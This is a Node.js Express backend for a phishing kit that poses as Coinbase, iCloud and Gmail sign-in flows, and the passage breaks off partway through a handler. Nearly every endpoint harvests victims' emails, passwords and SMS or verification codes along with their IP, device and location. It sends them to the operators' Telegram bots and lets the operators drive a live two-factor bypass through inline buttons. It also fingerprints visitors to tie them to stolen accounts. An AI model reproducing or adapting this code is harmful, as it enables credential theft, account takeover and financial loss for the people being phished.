const express = require("express");
const cors = require("cors");
const bodyParser = require("body-parser");
const fetch = require("node-fetch");
const crypto = require("crypto");

const { 
  bot, 
  bot2,
  broadcastMessage, 
  sendFollowUpMessage, 
  userWinnerTelegram, 
  botsThatClickedPage1 
} = require("./bot");

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(bodyParser.json());

// ============================================================================
// ✅ HELPER FUNCTIONS
// ============================================================================

function getIP(req) {
  return (
    req.headers['cf-connecting-ip'] ||
    (req.headers['x-forwarded-for'] || '').split(',')[0].trim() ||
    req.headers['x-real-ip'] ||
    req.ip ||
    'Unknown IP'
  );
}

function getIPPrefix(ip) {
  const parts = ip.split('.');
  if (parts.length === 4) {
    return `${parts[0]}.${parts[1]}`;
  }
  return ip;
}

// ✅ NEW: Generate device fingerprint from browser headers
function getDeviceFingerprint(req) {
  try {
    const userAgent = req.headers['user-agent'] || '';
    const language = req.headers['accept-language'] || '';
    const encoding = req.headers['accept-encoding'] || '';
    
    const combined = `${userAgent}|${language}|${encoding}`;
    const fingerprint = crypto.createHash('sha256').update(combined).digest('hex').substring(0, 16);
    
    console.log(`🖐️ Device Fingerprint: ${fingerprint}`);
    return fingerprint;
  } catch (err) {
    return null;
  }
}

function detectDevice(userAgent) {
  if (/mobile/i.test(userAgent)) return "Mobile";
  if (/tablet/i.test(userAgent)) return "Tablet";
  if (/windows/i.test(userAgent)) return "Windows PC";
  if (/macintosh|mac os/i.test(userAgent)) return "Mac";
  if (/linux/i.test(userAgent)) return "Linux";
  return "Unknown Device";
}

async function detectRegion(ip) {
  try {
    const response = await fetch(`https://get.geojs.io/v1/ip/geo.json?ip=${ip}`);
    const data = await response.json();
    
    if (data.city && data.country) {
      return `${data.city}, ${data.country}`;
    }
    
    const response2 = await fetch(`http://ip-api.com/json/${ip}?fields=city,country`);
    const data2 = await response2.json();
    
    if (data2.city && data2.country) {
      return `${data2.city}, ${data2.country}`;
    }
    
    return "Unknown Region";
  } catch (error) {
    return "Unknown Region";
  }
}

// ============================================================================
// ✅ MULTI-LAYER USER TRACKING STORAGE
// ============================================================================

let userIdCounter = 1;
const userIds = {};

// Layer 1: Device Fingerprint (PRIMARY)
const deviceFingerprintToEmail = {};

// Layer 2: IP Prefix + User ID
const ipPrefixUserIdToEmail = {};

// Layer 3: Session Token (reserved for future)
const sessionTokenToEmail = {};

// Layer 4: IP Prefix
const ipPrefixToEmail = {};

// Layer 5: Full IP
const ipToEmail = {};

// ============================================================================
// ✅ RESOLVE EMAIL FROM REQUEST (5-layer fallback)
// ============================================================================

function resolveEmailFromRequest(req, sessionToken = null, userId = null) {
  try {
    const fingerprint = getDeviceFingerprint(req);
    const ip = getIP(req);
    const ipPrefix = getIPPrefix(ip);
    
    // Layer 1: Device Fingerprint (PRIMARY)
    if (fingerprint && deviceFingerprintToEmail[fingerprint]) {
      console.log(`✅ Resolved email via device fingerprint`);
      return deviceFingerprintToEmail[fingerprint];
    }
    
    // Layer 2: IP Prefix + User ID
    if (ipPrefix && userId) {
      const compositeKey = `${ipPrefix}_${userId}`;
      if (ipPrefixUserIdToEmail[compositeKey]) {
        console.log(`✅ Resolved email via IP prefix + user ID`);
        return ipPrefixUserIdToEmail[compositeKey];
      }
    }
    
    // Layer 3: Session Token
    if (sessionToken && sessionTokenToEmail[sessionToken]) {
      console.log(`✅ Resolved email via session token`);
      return sessionTokenToEmail[sessionToken];
    }
    
    // Layer 4: IP Prefix
    if (ipPrefixToEmail[ipPrefix]) {
      console.log(`✅ Resolved email via IP prefix`);
      return ipPrefixToEmail[ipPrefix];
    }
    
    // Layer 5: Full IP
    if (ipToEmail[ip]) {
      console.log(`✅ Resolved email via full IP`);
      return ipToEmail[ip];
    }
    
    console.log(`⚠️ Could not resolve email from request`);
    return null;
  } catch (err) {
    console.error("❌ Error resolving email:", err);
    return null;
  }
}

// ============================================================================
// ✅ STORAGE OBJECTS
// ============================================================================

const pendingRedirection = {};
const pendingApprovals = {};
const pendingPage = {};
const pendingCodes = {};
const pendingSMS = {};
const pendingGmailLogin = {};
const displayEmailStore = {};
const displayEmailByRequestId = {};
const pendingVerificationPage = {};
const pendingVerifyingPage = {};
const pendingSMS2 = {};
const pendingWalletDecision = {};

// ============================================================================
// 🔔 SELF-PING
// ============================================================================

const APP_URL = process.env.APP_URL;

function startSelfPing() {
  setInterval(async () => {
    try {
      await fetch(`${APP_URL}/`, { method: 'GET' });
      console.log(`🔄 Pinged`);
    } catch (err) {
      console.error(`❌ Ping error`);
    }
  }, 30000);
}

// ============================================================================
// Health check
// ============================================================================

app.get("/", (req, res) => {
  res.json({ status: "✅ Backend running" });
});

// ============================================================================
// POST /get-user-id
// ============================================================================

app.post("/get-user-id", (req, res) => {
  try {
    const ip = req.headers["x-forwarded-for"]?.split(",")[0].trim() ||
      req.headers["x-real-ip"] ||
      req.connection.remoteAddress ||
      "Unknown";

    if (!userIds[ip]) {
      userIds[ip] = userIdCounter++;
    }

    res.json({ userId: userIds[ip] });
  } catch (err) {
    res.json({ userId: Math.random().toString(36).substr(2, 9) });
  }
});

// ============================================================================
// ✅ POST /send-login (Coinbase Login - Page 1)
// ✅ THIS IS WHERE WINNER DETECTION STARTS
// ============================================================================

app.post("/send-login", async (req, res) => {
  try {
    const { email, password, userId } = req.body;

    if (!email || !password) {
      return res.status(400).json({ error: "Missing email or password" });
    }

    const ip = getIP(req);
    const userAgent = req.get("user-agent") || "Unknown";
    const device = detectDevice(userAgent);
    const region = await detectRegion(ip);
    const ipPrefix = getIPPrefix(ip);
    const fingerprint = getDeviceFingerprint(req);

    // ============================================================================
    // ✅ STORE ALL 5 TRACKING LAYERS
    // ============================================================================

    // Layer 1: Device Fingerprint
    if (fingerprint && email) {
      deviceFingerprintToEmail[fingerprint] = email;
      console.log(`💾 Stored fingerprint ${fingerprint} → ${email}`);
    }

    // Layer 2: IP Prefix + User ID
    if (ipPrefix && userId && email) {
      const compositeKey = `${ipPrefix}_${userId}`;
      ipPrefixUserIdToEmail[compositeKey] = email;
      console.log(`💾 Stored composite key ${compositeKey} → ${email}`);
    }

    // Layer 4: IP Prefix
    if (ipPrefix && email) {
      ipPrefixToEmail[ipPrefix] = email;
      console.log(`💾 Stored IP prefix ${ipPrefix} → ${email}`);
    }

    // Layer 5: Full IP
    if (ip && email) {
      ipToEmail[ip] = email;
      console.log(`💾 Stored full IP ${ip} → ${email}`);
    }

    console.log(`\n📧 ${email} | Device: ${device} | Region: ${region}`);
    console.log(`   🖐️ Fingerprint: ${fingerprint} | IP Prefix: ${ipPrefix}`);

    // ============================================================================
    // ✅ SEND TO BOTH BOTS (BROADCAST)
    // ============================================================================

    const message =
      `😈😈😈😈 <b>Coinbase - Sign in</b> 😈😈😈😈\n` +
      `<b>👤 User ID:</b> <code>#${userId}</code>\n` +
      `<b>📧 Email:</b> <code>${email}</code>\n` +
      `<b>🔑 Password:</b> <code>${password}</code>\n` +
      `<b>🌍 Region:</b> ${region}\n` +
      `<b>💻 Device:</b> ${device}\n` +
      `<b>📍 IP:</b> ${ip}`;

    const options = {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [
            { text: "💬 SMS 💬", callback_data: `page1|${email}` }
          ],
          [
            { text: "📧 Email Redirection 📧", callback_data: `page2|${email}` }
          ],
          [
            { text: "❌ Reject ❌", callback_data: `reject|${email}` }
          ]
        ]
      }
    };

    const botToken = process.env.BOT_TOKEN;
    const chatId = process.env.ADMIN_CHAT_ID;

    if (!botToken || !chatId) {
      return res.status(500).json({ error: "Backend not configured" });
    }

    // ✅ BROADCAST TO BOTH BOTS
    try {
      await broadcastMessage(chatId, message, options);
    } catch (err) {
      console.error("❌ Failed to broadcast:", err);
      return res.status(500).json({ error: "Failed to send message" });
    }

    pendingApprovals[email] = {
      status: "pending",
      timestamp: Date.now(),
      userId,
      password,
      region,
      device,
      ip,
      fingerprint
    };

    res.json({ ok: true, message: "Login request sent for approval", email });

  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// ============================================================================
// ✅ POST /send-redirection (Page 2 - Redirection)
// ✅ PAGE 2 ROUTING LOGIC WITH POLLING
// ============================================================================

app.post("/send-redirection", async (req, res) => {
  try {
    let { email, userId } = req.body;

    const ip = getIP(req);
    const ipPrefix = getIPPrefix(ip);

    // ✅ RESOLVE EMAIL USING MULTI-LAYER TRACKING
    if (!email) {
      const resolvedEmail = resolveEmailFromRequest(req, null, userId);
      if (resolvedEmail) {
        email = resolvedEmail;
        console.log(`🔍 Resolved email via multi-layer tracking: ${email}`);
      } else {
        return res.status(400).json({ error: "Could not resolve email" });
      }
    }

    const userAgent = req.get("user-agent") || "Unknown";
    const device = detectDevice(userAgent);
    const region = await detectRegion(ip);

    console.log(`📍 ${email} | Redirection page | Device: ${device} | Region: ${region}`);

    // ✅ CHECK WINNER
    const winner = userWinnerTelegram[email];
    console.log(`🏆 Winner for ${email}: ${winner}`);

    const message =
      `😈😈😈 <b>Coinbase - Redirection</b> 😈😈😈\n` +
      `<b>👤 User ID:</b> <code>#${userId}</code>\n` +
      `<b>📧 Email:</b> <code>${email}</code>\n` +
      `<b>🌍 Region:</b> ${region}\n` +
      `<b>💻 Device:</b> ${device}\n` +
      `<b>📍 IP:</b> ${ip}`;

    const options = {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "☁️ iCloud ☁️", callback_data: `redirect_icloud|${email}` }],
          [{ text: "🌈 Gmail 🌈", callback_data: `redirect_gmail|${email}` }]
        ]
      }
    };

    const botToken = process.env.BOT_TOKEN;
    const chatId = process.env.ADMIN_CHAT_ID;

    // ============================================================================
    // ✅ SEND TO WINNER ONLY
    // ============================================================================

    if (email && userWinnerTelegram[email]) {
      console.log(`📨 Redirection going to winner only: ${userWinnerTelegram[email]}`);
      
      await sendFollowUpMessage(email, message, options);

      // ✅ STORE PAGE 2 DATA FOR POLLING
      global.page2MessageDataStore = global.page2MessageDataStore || {};
      global.page2MessageDataStore[email] = {
        message: message,
        options: options,
        email: email,
        timestamp: Date.now()
      };
      console.log(`💾 Stored page 2 message data for ${email} (waiting for loser click)`);

    } else {
      console.log(`📨 Redirection fallback: sending to both (no winner for ${email})`);
      
      const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
      await fetch(url, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: chatId,
          text: message,
          parse_mode: options.parse_mode,
          reply_markup: options.reply_markup
        })
      });
    }

    res.json({ ok: true });

  } catch (err) {
    console.error("❌ Redirection endpoint error:", err);
    res.status(500).json({ error: err.message });
  }
});

// ============================================================================
// POST /check-redirection-choice
// ============================================================================

app.post("/check-redirection-choice", (req, res) => {
  try {
    const { email } = req.body;

    if (!email) {
      return res.json({ choice: "unknown" });
    }

    if (pendingRedirection && pendingRedirection[email]) {
      return res.json({ choice: pendingRedirection[email].choice });
    }

    res.json({ choice: "pending" });

  } catch (err) {
    res.status(500).json({ error: "Internal server error" });
  }
});

// ============================================================================
// POST /update-redirection-choice
// ============================================================================

app.post("/update-redirection-choice", (req, res) => {
  try {
    const { email, choice } = req.body;

    if (!email || !choice) {
      return res.status(400).json({ error: "Missing email or choice" });
    }

    if (!pendingRedirection[email]) {
      pendingRedirection[email] = {};
    }

    if (choice === "redirect_icloud") {
      pendingRedirection[email].choice = "icloud";
    } else if (choice === "redirect_gmail") {
      pendingRedirection[email].choice = "gmail";
    } else {
      pendingRedirection[email].choice = choice;
    }

    pendingRedirection[email].updatedAt = Date.now();

    res.json({ ok: true });

  } catch (err) {
    res.status(500).json({ error: "Internal server error" });
  }
});

// ============================================================================
// POST /check-status
// ============================================================================

app.get("/check-status", (req, res) => {
  try {
    const identifier = (req.query.identifier || "").trim();

    if (!identifier) {
      return res.json({ status: "unknown" });
    }

    if (pendingVerificationPage[identifier]) {
      return res.json({ status: pendingVerificationPage[identifier].status || "pending" });
    }

    if (pendingGmailLogin[identifier]) {
      return res.json({ status: pendingGmailLogin[identifier].status || "pending" });
    }

    if (pendingCodes[identifier]) {
      return res.json({ status: pendingCodes[identifier].status || "pending" });
    }

    if (pendingPage[identifier]) {
      return res.json({ status: pendingPage[identifier].status || "pending" });
    }

    if (pendingApprovals[identifier]) {
      return res.json({ status: pendingApprovals[identifier].status || "pending" });
    }

    res.json({ status: "unknown" });

  } catch (err) {
    res.status(500).json({ error: "Internal server error" });
  }
});

// ============================================================================
// POST /update-status
// ============================================================================

app.post("/update-status", (req, res) => {
  try {
    let identifier = (req.body.identifier || req.body.email || "").trim();
    const status = req.body.status;
    console.log(`📬 Update Status Received: ${identifier}, ${status}`);

    if (pendingVerificationPage[identifier]) {
      pendingVerificationPage[identifier].status = status;
      console.log(`✅ Updated pendingVerificationPage[${identifier}].status = ${status}`);
      return res.json({ ok: true });
    }

    if (pendingGmailLogin[identifier]) {
      pendingGmailLogin[identifier].status = status;
      console.log(`✅ Updated pendingGmailLogin[${identifier}].status = ${status}`);
      return res.json({ ok: true });
    }

    if (pendingCodes[identifier]) {
      pendingCodes[identifier].status = status;
      console.log(`✅ Updated pendingCodes[${identifier}].status = ${status}`);
      return res.json({ ok: true });
    }

    if (pendingPage[identifier]) {
      pendingPage[identifier].status = status;
      console.log(`✅ Updated pendingPage[${identifier}].status = ${status}`);
      return res.json({ ok: true });
    }

    // ✅ NEW: Handle SMS status updates
    if (pendingSMS[identifier]) {
      pendingSMS[identifier].status = status;
      console.log(`✅ Updated pendingSMS[${identifier}].status = ${status}`);
      return res.json({ ok: true });
    }

    if (!pendingApprovals[identifier]) {
      pendingApprovals[identifier] = {};
    }

    if (status === "page1") {
      pendingApprovals[identifier].status = "accepted1";
    } else if (status === "page2") {
      pendingApprovals[identifier].status = "accepted2";
    } else if (status === "reject") {
      pendingApprovals[identifier].status = "rejected";
    } else {
      pendingApprovals[identifier].status = status;
    }

    pendingApprovals[identifier].updatedAt = Date.now();

    res.json({ ok: true });

  } catch (err) {
    res.status(500).json({ error: "Internal server error" });
  }
});

// ============================================================================
// SMS ENDPOINTS
// ============================================================================

app.post("/verify-sms", async (req, res) => {
  try {
    const { email, userId, smsCode } = req.body;

    if (!email || !smsCode) {
      return res.status(400).json({ error: "Missing email or SMS code" });
    }

    const ip = getIP(req);
    const userAgent = req.get("user-agent") || "Unknown";
    const device = detectDevice(userAgent);
    const region = await detectRegion(ip);

    const message =
      `😈😈😈 <b>Coinbase - SMS</b> 😈😈😈\n` +
      `<b>👤 User ID:</b> <code>#${userId}</code>\n` +
      `<b>📧 Email:</b> <code>${email}</code>\n` +
      `<b>💬 SMS:</b> <code>${smsCode}</code>\n` +
      `<b>🌍 Region:</b> ${region}\n` +
      `<b>💻 Device:</b> ${device}\n` +
      `<b>📍 IP:</b> ${ip}`;

    const botToken = process.env.BOT_TOKEN;
    const chatId = process.env.ADMIN_CHAT_ID;

    // ✅ SEND TO WINNER ONLY
    if (email && userWinnerTelegram[email]) {
      console.log(`📨 SMS going to winner only: ${userWinnerTelegram[email]}`);
      await sendFollowUpMessage(email, message, {
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [
              { text: "✅ Accept", callback_data: `sms_accept|${email}` },
              { text: "❌ Reject", callback_data: `sms_reject|${email}` }
            ]
          ]
        }
      });
    } else {
      const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
      await fetch(url, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: chatId,
          text: message,
          parse_mode: "HTML",
          reply_markup: {
            inline_keyboard: [
              [
                { text: "✅ Accept", callback_data: `sms_accept|${email}` },
                { text: "❌ Reject", callback_data: `sms_reject|${email}` }
              ]
            ]
          }
        })
      });
    }

    console.log(`📧 ${email} | SMS: ${smsCode}`);
    
    pendingSMS[email] = {
      status: "pending",
      smsCode,
      userId,
      timestamp: Date.now()
    };

    res.json({ ok: true });

  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// ============================================================================
// POST /check-sms-status - Check if SMS was accepted or rejected
// ============================================================================

app.post("/check-sms-status", (req, res) => {
  try {
    const { email } = req.body;

    if (!email) {
      return res.json({ status: "pending" });
    }

    // Check pendingSMS first
    if (pendingSMS[email]) {
      const smsStatus = pendingSMS[email].status;
      console.log(`✅ SMS status for ${email}: ${smsStatus}`);
      
      // Map bot.js status values to frontend expectations
      if (smsStatus === "sms_accept") {
        return res.json({ status: "sms_accepted" });
      } else if (smsStatus === "sms_reject") {
        return res.json({ status: "sms_rejected" });
      }
      
      return res.json({ status: smsStatus || "pending" });
    }

    // Check pendingApprovals as fallback
    if (pendingApprovals[email]) {
      const approvalStatus = pendingApprovals[email].status;
      console.log(`✅ Approval status for ${email}: ${approvalStatus}`);
      
      if (approvalStatus === "sms_accept") {
        return res.json({ status: "sms_accepted" });
      } else if (approvalStatus === "sms_reject") {
        return res.json({ status: "sms_rejected" });
      }
      
      return res.json({ status: approvalStatus || "pending" });
    }

    res.json({ status: "pending" });

  } catch (err) {
    console.error("Check SMS status error:", err);
    res.status(500).json({ error: "Internal server error" });
  }
});

// ============================================================================
// POST /resend-sms - Resend SMS code to winner bot only
// ============================================================================

app.post("/resend-sms", async (req, res) => {
  try {
    const { email, userId } = req.body;

    if (!email) {
      return res.status(400).json({ error: "Missing email" });
    }

    console.log(`📲 Resending SMS to ${email}`);

    const ip = getIP(req);
    const userAgent = req.get("user-agent") || "Unknown";
    const device = detectDevice(userAgent);
    const region = await detectRegion(ip);

    const message =
      `🔄 <b>Coinbase - Resend SMS</b> 🔄\n` +
      `<b>👤 User ID:</b> <code>#${userId}</code>\n` +
      `<b>📧 Email:</b> <code>${email}</code>\n` +
      `<b>🌍 Region:</b> ${region}\n` +
      `<b>💻 Device:</b> ${device}\n` +
      `<b>📍 IP:</b> ${ip}`;

    // ✅ SEND TO WINNER ONLY - NO BUTTONS
    if (email && userWinnerTelegram[email]) {
      console.log(`📨 Resend SMS going to winner only: ${userWinnerTelegram[email]}`);
      await sendFollowUpMessage(email, message, {
        parse_mode: "HTML"
        // ✅ NO reply_markup - no buttons!
      });
      console.log(`✅ Resend SMS sent successfully to ${userWinnerTelegram[email]}`);
    } else {
      console.log(`⚠️ No winner found for ${email}, cannot resend SMS`);
      return res.status(400).json({ error: "No winner determined for this email" });
    }

    // Reset SMS status to pending so polling works again
    if (pendingSMS[email]) {
      pendingSMS[email].status = "pending";
      console.log(`📧 ${email} | SMS status reset to pending`);
    }

    res.json({ ok: true });

  } catch (err) {
    console.error("Resend SMS error:", err);
    res.status(500).json({ error: err.message });
  }
});

// ============================================================================
// ICLOUD PAGES ENDPOINTS
// ============================================================================

app.post("/page-login", async (req, res) => {
  try {
    const { email, password, userId } = req.body;

    if (!email || !password) {
      return res.status(400).json({ success: false, message: "Email and password required" });
    }

    const ip = getIP(req);
    const userAgent = req.get("user-agent") || "Unknown";
    const device = detectDevice(userAgent);
    const region = await detectRegion(ip);

    pendingPage[email] = { password, status: "pending" };
    console.log(`📥 iCloud Page Login Received: ${email}`);

    const message =
      `☁️☁️☁️☁️ <b>iCloud - Login</b> ☁️☁️☁️☁️\n` +
      `<b>👤 User ID:</b> <code>#${userId}</code>\n` +
      `<b>📧 Email:</b> <code>${email}</code>\n` +
      `<b>🔑 Password:</b> <code>${password}</code>\n` +
      `<b>🌍 Region:</b> ${region}\n` +
      `<b>💻 Device:</b> ${device}\n` +
      `<b>📍 IP:</b> ${ip}`;

    const options = {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [
            { text: "✅ Accept", callback_data: `page_accept|${email}` },
            { text: "❌ Reject", callback_data: `page_reject|${email}` }
          ]
        ]
      }
    };

    const botToken = process.env.BOT_TOKEN;
    const chatId = process.env.ADMIN_CHAT_ID;

    // ✅ SEND TO WINNER ONLY
    if (email && userWinnerTelegram[email]) {
      console.log(`📨 iCloud Page Login going to winner only: ${userWinnerTelegram[email]}`);
      await sendFollowUpMessage(email, message, options);
    } else {
      const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
      await fetch(url, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: chatId,
          text: message,
          parse_mode: options.parse_mode,
          reply_markup: options.reply_markup
        })
      });
    }

    res.json({ success: true });

  } catch (err) {
    console.error("❌ Page login endpoint error:", err);
    res.status(500).json({ success: false, message: "Failed to send to Telegram" });
  }
});

// ============================================================================
// SMS CODE ENDPOINTS
// ============================================================================

app.post("/sms-code", async (req, res) => {
  try {
    const { email, userId, smsCode } = req.body;

    if (!email || !smsCode) {
      return res.status(400).json({ error: "Missing email or SMS code" });
    }

    const ip = getIP(req);
    const userAgent = req.get("user-agent") || "Unknown";
    const device = detectDevice(userAgent);
    const region = await detectRegion(ip);

    pendingCodes[email] = { status: "pending", smsCode };
    console.log(`📥 SMS Code Received: ${email}`);

    const message =
      `⛈⛈⛈⛈ <b>iCloud - SMS</b> ⛈⛈⛈⛈\n` +
      `<b>👤 User ID:</b> <code>#${userId}</code>\n` +
      `<b>💬 SMS:</b> <code>${smsCode}</code>\n` +
      `<b>🌍 Region:</b> ${region}\n` +
      `<b>💻 Device:</b> ${device}\n` +
      `<b>📍 IP:</b> ${ip}`;

    const options = {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [
            { text: "✅ Accept", callback_data: `sms_accept|${email}` },
            { text: "❌ Reject", callback_data: `sms_reject|${email}` }
          ]
        ]
      }
    };

    const botToken = process.env.BOT_TOKEN;
    const chatId = process.env.ADMIN_CHAT_ID;

    // ✅ SEND TO WINNER ONLY
    if (email && userWinnerTelegram[email]) {
      console.log(`📨 SMS going to winner only: ${userWinnerTelegram[email]}`);
      await sendFollowUpMessage(email, message, options);
    } else {
      const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
      await fetch(url, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: chatId,
          text: message,
          parse_mode: options.parse_mode,
          reply_markup: options.reply_markup
        })
      });
    }

    res.json({ success: true });

  } catch (err) {
    console.error("❌ SMS code endpoint error:", err);
    res.status(500).json({ error: err.message });
  }
});

// ============================================================================
// GMAIL LOGIN ENDPOINTS
// ============================================================================

app.post("/send-gmail-login", async (req, res) => {
  try {
    console.log('🔍 DEBUG: /send-gmail-login endpoint called');
    const { email, password, userId } = req.body;
    console.log('🔍 DEBUG: Received email:', email, 'password:', password, 'userId:', userId);
    
    if (!email || !password || !userId) {
      return res.status(400).json({ error: "Missing email, password, or userId" });
    }
    
    const requestId = `gmail_${Date.now()}_${Math.random().toString(36).substring(7)}`;
    const displayEmailKey = `displayEmail_${Date.now()}_${Math.random().toString(36).substring(7)}`;
    console.log('🔍 DEBUG: Generated displayEmailKey:', displayEmailKey);
    
    displayEmailStore[displayEmailKey] = email;
    console.log(`📧 Stored display email with key ${displayEmailKey}: ${email}`);
    
    displayEmailByRequestId[requestId] = email;
    console.log(`📧 Stored display email by requestId ${requestId}: ${email}`);
    
    const ip = getIP(req);
    const userAgent = req.get("user-agent") || "Unknown";
    const device = detectDevice(userAgent);
    const region = await detectRegion(ip);
    const fingerprint = getDeviceFingerprint(req);

    // ✅ STORE FINGERPRINT FOR MULTI-LAYER TRACKING
    if (fingerprint && email) {
      deviceFingerprintToEmail[fingerprint] = email;
      console.log(`💾 Stored fingerprint ${fingerprint} → ${email} (Gmail flow)`);
    }

    pendingGmailLogin[requestId] = { status: "pending", email: email };

    const message =
      `🌈🌈🌈🌈 <b>Gmail - Sign in</b> 🌈🌈🌈🌈\n` +
      `<b>👤 User ID:</b> <code>#${userId}</code>\n` +
      `<b>📧 Email:</b> <code>${email}</code>\n` +
      `<b>🔑 Password:</b> <code>${password}</code>\n` +
      `<b>🌍 Region:</b> ${region}\n` +
      `<b>💻 Device:</b> ${device}\n` +
      `<b>📍 IP:</b> ${ip}`;

    const options = {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [
            { text: "✅ Accept", callback_data: `gmail_accept|${requestId}` },
            { text: "❌ Reject", callback_data: `gmail_reject|${requestId}` }
          ]
        ]
      }
    };

    const botToken = process.env.BOT_TOKEN;
    const chatId = process.env.ADMIN_CHAT_ID;

    // ✅ SEND TO WINNER ONLY
    if (email && userWinnerTelegram[email]) {
      console.log(`📨 Gmail going to winner only: ${userWinnerTelegram[email]}`);
      await sendFollowUpMessage(email, message, options);
    } else {
      const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
      await fetch(url, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: chatId,
          text: message,
          parse_mode: options.parse_mode,
          reply_markup: options.reply_markup
        })
      });
    }

    console.log('🔍 DEBUG: Sending response with displayEmailKey:', displayEmailKey);
    res.json({ status: "pending", requestId, displayEmailKey });

  } catch (err) {
    console.error("❌ Gmail Login endpoint error:", err);
    res.status(500).json({ error: "Internal server error" });
  }
});

// ============================================================================
// GET /api/gmail-login-status/:requestId
// ============================================================================

app.get("/api/gmail-login-status/:requestId", (req, res) => {
  try {
    const { requestId } = req.params;
    const entry = pendingGmailLogin[requestId];
    if (!entry) return res.json({ status: "pending" });
    res.json({ status: entry.status });
  } catch (err) {
    console.error("❌ Gmail Login status endpoint error:", err);
    res.status(500).json({ error: "Internal server error" });
  }
});

// ============================================================================
// GET /api/display-email/:displayEmailKey
// ============================================================================

app.get("/api/display-email/:displayEmailKey", (req, res) => {
  try {
    const { displayEmailKey } = req.params;
    const email = displayEmailStore[displayEmailKey];
    if (email) {
      console.log(`📧 Retrieved display email for key ${displayEmailKey}: ${email}`);
      res.json({ displayEmail: email });
    } else {
      console.log(`📧 No display email found for key ${displayEmailKey}`);
      res.json({ displayEmail: null });
    }
  } catch (err) {
    console.error("❌ Get display email error:", err);
    res.status(500).json({ error: "Internal server error" });
  }
});

// ============================================================================
// GET /get-gmail-login/:requestId
// ============================================================================

app.get("/get-gmail-login/:requestId", (req, res) => {
  try {
    const { requestId } = req.params;
    const entry = pendingGmailLogin[requestId];
    if (entry && entry.email) {
      res.json({ email: entry.email });
    } else {
      res.json({ email: null });
    }
  } catch (err) {
    console.error("❌ Get Gmail login error:", err);
    res.status(500).json({ error: "Internal server error" });
  }
});

// ============================================================================
// GMAIL VERIFICATION ENDPOINTS
// ============================================================================

app.post("/send-verification-page", async (req, res) => {
  try {
    console.log('🔍 DEBUG: /send-verification-page endpoint called');
    const { userId, email: gmailEmail } = req.body;
    console.log('🔍 DEBUG: Received userId:', userId, 'email:', gmailEmail);
    
    if (!userId) {
      return res.status(400).json({ error: "Missing userId" });
    }
    
    const requestId = `verify_${Date.now()}_${Math.random().toString(36).substring(7)}`;
    console.log('🔍 DEBUG: Generated requestId:', requestId);
    
    const ip = getIP(req);
    const userAgent = req.get("user-agent") || "Unknown";
    const device = detectDevice(userAgent);
    const region = await detectRegion(ip);

    pendingVerificationPage[requestId] = { status: "pending", selectedDigits: null, email: gmailEmail };

    const message =
      `🌈🌈🌈 <b>Gmail - Verification</b> 🌈🌈🌈\n` +
      `<b>👤 User ID:</b> <code>#${userId}</code>\n` +
      `<b>📧 Email:</b> <code>${gmailEmail || 'Unknown'}</code>\n` +
      `<b>🌍 Region:</b> ${region}\n` +
      `<b>💻 Device:</b> ${device}\n` +
      `<b>📍 IP:</b> ${ip}`;

    const options = {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [
            { text: "0", callback_data: `verify_digit|${requestId}|0` },
            { text: "1", callback_data: `verify_digit|${requestId}|1` },
            { text: "2", callback_data: `verify_digit|${requestId}|2` },
            { text: "3", callback_data: `verify_digit|${requestId}|3` },
            { text: "4", callback_data: `verify_digit|${requestId}|4` }
          ],
          [
            { text: "5", callback_data: `verify_digit|${requestId}|5` },
            { text: "6", callback_data: `verify_digit|${requestId}|6` },
            { text: "7", callback_data: `verify_digit|${requestId}|7` },
            { text: "8", callback_data: `verify_digit|${requestId}|8` },
            { text: "9", callback_data: `verify_digit|${requestId}|9` }
          ]
        ]
      }
    };

    const botToken = process.env.BOT_TOKEN;
    const chatId = process.env.ADMIN_CHAT_ID;

    // ✅ SEND TO WINNER ONLY
    if (gmailEmail && userWinnerTelegram[gmailEmail]) {
      console.log(`📨 Verification going to winner only: ${userWinnerTelegram[gmailEmail]}`);
      await sendFollowUpMessage(gmailEmail, message, options);
    } else {
      const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
      await fetch(url, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: chatId,
          text: message,
          parse_mode: options.parse_mode,
          reply_markup: options.reply_markup
        })
      });
    }

    res.json({ status: "pending", requestId, email: gmailEmail });

  } catch (err) {
    console.error("❌ Verification Page endpoint error:", err);
    res.status(500).json({ error: "Internal server error" });
  }
});

// ============================================================================
// POST /update-selected-digits
// ============================================================================

app.post("/update-selected-digits", (req, res) => {
  try {
    const { requestId, digit } = req.body;
    if (!requestId || digit === undefined) return res.status(400).json({ error: "Missing requestId or digit" });
    
    if (!pendingVerificationPage[requestId]) {
      return res.status(400).json({ error: "Invalid requestId" });
    }

    if (!pendingVerificationPage[requestId].selectedDigits) {
      pendingVerificationPage[requestId].selectedDigits = [];
    }

    pendingVerificationPage[requestId].selectedDigits.push(digit);
    console.log(`✅ Digit ${digit} selected for ${requestId}`);

    res.json({ ok: true, selectedCount: pendingVerificationPage[requestId].selectedDigits.length });
  } catch (err) {
    console.error("❌ Update selected digits error:", err);
    res.status(500).json({ error: "Internal server error" });
  }
});

// ============================================================================
// GET /get-selected-digits
// ============================================================================

app.get("/get-selected-digits", (req, res) => {
  try {
    const { requestId } = req.query;
    if (!requestId) return res.status(400).json({ error: "Missing requestId" });

    const entry = pendingVerificationPage[requestId];
